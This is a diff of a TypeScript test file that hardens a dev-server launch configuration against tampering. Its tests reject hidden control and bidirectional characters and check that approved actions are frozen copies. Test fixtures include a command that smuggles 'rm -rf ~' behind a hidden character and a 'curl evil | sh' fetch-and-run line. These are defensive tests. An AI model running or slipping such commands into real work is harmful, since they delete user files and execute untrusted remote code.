@@ -15,9 +15,11 @@ import {
   SERVE_APPROVAL_FIELDS,
   SERVE_CONFIG_FIELD_NAMES,
   SERVE_OUTSIDE_APPROVAL_FIELDS,
+  isMintedServeAction,
   readServeConfig,
   resolveApprovedServeConfig,
   serveApprovalHash,
+  type ServeApprovalPrompt,
   type ServeConfig,
   type ServeConfigReadResult,
   validateServeConfig
@@ -209,6 +211,57 @@ test('rejects constrained values that retain their structural types', async () =
   }
 })
 
+test('rejects a control or format character hidden in the command or an env value', async () => {
+  const hidden = [0x0a, 0x0d, 0x1b, 0x09, 0x200b, 0x202e, 0x2028, 0x2029].map((code) => String.fromCharCode(code))
+  for (const char of hidden) {
+    const inCommand = validServeJson()
+    actionOf(inCommand).command = `bun run dev${char}rm -rf ~`
+    await expect(validateServeConfig(inCommand, createProject()), `U+${char.charCodeAt(0).toString(16)} in command`).rejects.toThrow(
+      'command: the command contains a control or format character'
+    )
+
+    const inEnv = validServeJson()
+    actionOf(inEnv).env = { MODE: `dev${char}x` }
+    await expect(validateServeConfig(inEnv, createProject()), `U+${char.charCodeAt(0).toString(16)} in env`).rejects.toThrow(
+      'env: value for MODE contains a control or format character'
+    )
+  }
+})
+
+test('rejects a bidi override hidden in the cwd', async () => {
+  const fixture = validServeJson()
+  actionOf(fixture).cwd = `web${String.fromCharCode(0x202e)}bin`
+  await expect(validateServeConfig(fixture, createProject())).rejects.toThrow(
+    'cwd: the directory contains a control or format character'
+  )
+})
+
+test('mints a frozen copy of the approved action that the returned config does not share', async () => {
+  const project = createProject()
+  const config = await validConfig(project)
+  const approved = resolveApprovedServeConfig({
+    config,
+    projectKey: 'github.com/acme/web',
+    approvalsFile: join(project, 'launch-approvals.json'),
+    confirm: () => true
+  })
+  if (!('action' in approved)) throw new Error('approval refused')
+  const action = approved.action
+
+  expect(isMintedServeAction(action)).toBe(true)
+  expect(isMintedServeAction(approved.config.actions[0])).toBe(false)
+  expect(isMintedServeAction({ ...action })).toBe(false)
+  expect(isMintedServeAction(JSON.parse(JSON.stringify(action)))).toBe(false)
+  expect(action).not.toBe(approved.config.actions[0])
+  expect([Object.isFrozen(action), Object.isFrozen(action.env), Object.isFrozen(action.inheritEnv)]).toEqual([true, true, true])
+
+  const original = action.command
+  approved.config.actions[0]!.command = 'curl evil | sh'
+  approved.config.actions[0]!.env.MODE = 'changed'
+  expect(action.command).toBe(original)
+  expect(action.env.MODE).toBeUndefined()
+})
+
 test('applies defaults when optional fields are absent', async () => {
   const project = createProject()
   const fixture = validServeJson()
@@ -306,7 +359,7 @@ test('requires one explicit approval before exposing a repository serve config',
   const config = await validConfig(project)
   const action = config.actions[0]!
   const approvalsFile = join(project, 'launch-approvals.json')
-  let prompt: { command: string; cwd: string; env: Record<string, string> } | undefined
+  let prompt: ServeApprovalPrompt | undefined
 
   const refused = resolveApprovedServeConfig({
     config,
@@ -318,7 +371,16 @@ test('requires one explicit approval before exposing a repository serve config',
     }
   })
   expect(refused).toEqual({ error: 'refused', prompted: true })
-  expect(prompt).toEqual({ command: action.command, cwd: action.cwd, env: action.env })
+  expect(prompt).toEqual({
+    command: action.command,
+    cwd: action.cwd,
+    env: action.env,
+    inheritEnv: action.inheritEnv,
+    port: action.port
+  })
+  expect(Object.keys(prompt!).sort(), 'the prompt shows exactly the fields the approval hash covers').toEqual(
+    [...SERVE_APPROVAL_FIELDS].sort()
+  )
 
   const approved = resolveApprovedServeConfig({
     config,
@@ -326,8 +388,7 @@ test('requires one explicit approval before exposing a repository serve config',
     approvalsFile,
     confirm: () => true
   })
-  expect('config' in approved).toBe(true)
-  expect(approved.prompted).toBe(true)
+  expect(approved).toMatchObject({ action, prompted: true })
 
   const changedTimeout: ServeConfig = {
     ...config,
